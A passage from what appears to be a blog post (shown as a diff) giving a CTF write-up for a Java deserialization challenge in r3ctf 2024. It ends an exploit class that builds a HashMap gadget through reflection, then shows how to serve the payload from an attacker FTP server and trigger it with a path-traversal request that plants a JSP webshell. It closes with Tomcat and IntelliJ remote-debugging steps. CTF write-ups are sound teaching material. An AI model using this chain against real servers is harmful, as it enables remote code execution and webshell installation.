+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="nf">makeMap</span><span class="o">(</span><span class="nc">Object</span> <span class="n">v1</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">v2</span> <span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="s">"size"</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">nodeC</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">nodeC</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.HashMap$Node"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span> <span class="nc">ClassNotFoundException</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="n">nodeC</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.HashMap$Entry"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="nc">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">nodeCons</span> <span class="o">=</span> <span class="n">nodeC</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">nodeC</span><span class="o">);</span>
+        <span class="n">nodeCons</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+        <span class="nc">Object</span> <span class="n">tbl</span> <span class="o">=</span> <span class="nc">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">nodeC</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+        <span class="nc">Array</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">tbl</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">nodeCons</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="kc">null</span><span class="o">));</span>
+        <span class="nc">Array</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">tbl</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="n">nodeCons</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">v2</span><span class="o">,</span> <span class="n">v2</span><span class="o">,</span> <span class="kc">null</span><span class="o">));</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="s">"table"</span><span class="o">,</span> <span class="n">tbl</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="nc">String</span> <span class="n">field</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">val</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">dField</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>
+        <span class="n">dField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">dField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">val</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>You can compile and run this exploit with the following command. You must be sure however to have all the necessary library downloaded on your system. Even though the 95% of them are already provided with the challenge, we need <code class="language-plaintext highlighter-rouge">javassist</code> to help us developing the exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-cp</span> <span class="s2">".:&lt;path-to-lib-folder-of-challenge&gt;/*:/&lt;path-to-your-downloaded-jar&gt;/*"</span> Main.java
+java <span class="nt">-cp</span> <span class="s2">".:&lt;path-to-lib-folder-of-challenge&gt;/*:/&lt;path-to-your-downloaded-jar&gt;/*"</span> Main
+</code></pre></div></div>
+
+<p>Now you just need to launch a simple FTP server and retrieve the file from there. I’ve used the following in order to create one.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">-p</span> 21 <span class="nt">-w</span> <span class="nt">--user</span><span class="o">=</span> <span class="nt">--password</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>Just sending a request to <code class="language-plaintext highlighter-rouge">http://challenge-url/gallery/api/decompress?path=../../ip:port/exploit.bin</code> is enough to download the file and trigger the deserialization process.</p>
+
+<p>Even if it will fail, our webshell will be created. We can just navigate to <code class="language-plaintext highlighter-rouge">http://challenge-url/gallery/exploit.jsp</code> and notice the output of the <code class="language-plaintext highlighter-rouge">id</code> command</p>
+
+<h2 id="appendix-a---java-debugging">Appendix A - Java Debugging</h2>
+
+<p>I would like to spend a couple of words regarding how to debug this specific challenge.</p>
+
+<p>The very first thing that you have to do is to move the <code class="language-plaintext highlighter-rouge">gallery.war</code> file into the <code class="language-plaintext highlighter-rouge">webapps</code> directory of Apache Tomcat.</p>
+
+<p>Then, we need to enable the debug on Tomcat. We can do that by simply editing the <code class="language-plaintext highlighter-rouge">catalina.sh</code> file, which is located into the <code class="language-plaintext highlighter-rouge">bin</code> directory of Apache Tomcat, adding the following line</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">CATALINA_OPTS</span><span class="o">=</span><span class="s2">"-Xdebug  -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8089"</span>
+</code></pre></div></div>
+
+<p>After that we can just run the <code class="language-plaintext highlighter-rouge">setup.sh</code> script on the same directory. This will not only enable the debug on Tomcat, but also deploy the <code class="language-plaintext highlighter-rouge">.war</code> file. 
+Pretty easy, isn’t it? It took me only <mark style="background: #FFB86CA6;">3 hours</mark> just to figure it out.</p>
+
+<p>Now, wouldn’t be beautiful if we can debug our code by clearly seeing every instruction and debugging every try of our exploit to understand <mark style="background: #FFB86CA6;">what the fuck</mark> is happening?</p>
+
+<p>So, let’s open Intellij IDEA (i’m sorry i don’t know how to do it in Eclipse). If you have already unzipped the <code class="language-plaintext highlighter-rouge">gallery.war</code> file you can open an already existing project and choose the <code class="language-plaintext highlighter-rouge">web</code> folder.</p>
+
+<p>Now you need to edit the run configuration. We need to do this in order to perform the Remote Debugging.
+Just click to open the main file, which is <code class="language-plaintext highlighter-rouge">ArtGaleryApplication.class</code> and click, on the upper tab, on <code class="language-plaintext highlighter-rouge">Current File</code> to expand it. You should now click on <code class="language-plaintext highlighter-rouge">Edit Configurations</code></p>
+
+<p><img src="/images/r3ctf-2024/first.png" alt="Image 1" /></p>
+
+<p>You can click on the plus sing, on the upper left corner, to add a configuration. Among all the options you must select <code class="language-plaintext highlighter-rouge">Remote JVM Debug</code>. You can now modify the port to match the one used into the <code class="language-plaintext highlighter-rouge">catalina.sh</code> file, which is the <code class="language-plaintext highlighter-rouge">8089</code>. 
+Moreover it’s important to select <code class="language-plaintext highlighter-rouge">&lt;no module&gt;</code> in the <code class="language-plaintext highlighter-rouge">Use module classpath</code> option.
+You can now click on <code class="language-plaintext highlighter-rouge">Apply</code>. We are not yet ready to debug our application, but we are really close.</p>
+
+<p>You must add the libraries to the project structure. So let’s just navigate to <code class="language-plaintext highlighter-rouge">File &gt; Project Structure</code>. In there you need to click on <code class="language-plaintext highlighter-rouge">Libraries</code> and then on the first plus symbol on the left and then on <code class="language-plaintext highlighter-rouge">Java</code>.</p>
+
+<p><img src="/images/r3ctf-2024/second.png" alt="Image 2" /></p>
+
+<p>From there you need to select the <code class="language-plaintext highlighter-rouge">src/WEB-INF/classes</code> folder in order to import the custom classes. You should repeat those steps also for the <code class="language-plaintext highlighter-rouge">src/WEB-INF/lib</code>.</p>
+
+<p>I hope everything is clear, it took me 5 hours to understand how in the world i can do such things. I’ve combined together different Chinese guides to proper understand how to do it, but in the end is working.</p>
+
+<p>Now you can just set a breakpoint whenever you want and launch the remote debugger using the green button with the bug in it. You can step into, step over and do whatever is useful for you in order to understand the whole process.</p>
+
+<h2 id="the-end">The End</h2>
+
+<p>Java security is pretty awesome in my opinion. There are a lot of interesting things in there, and several attacks that are starting to interesting me. I don’t know if those things are outdated, or deserialization bugs are dead nowadays. I just find interesting to find new gadgets and bypasses, so i’ll do it regardless.</p>
+
+<p>I’ve found a lot of resources in Chinese, and i’ve got really hard time to understand how the exploit chain was working due to debugging issues.</p>
+
+<p>I would like to thank really much @to016 for creating this challenge, and as always for dealing with me during all my annoying questions.</p>
+
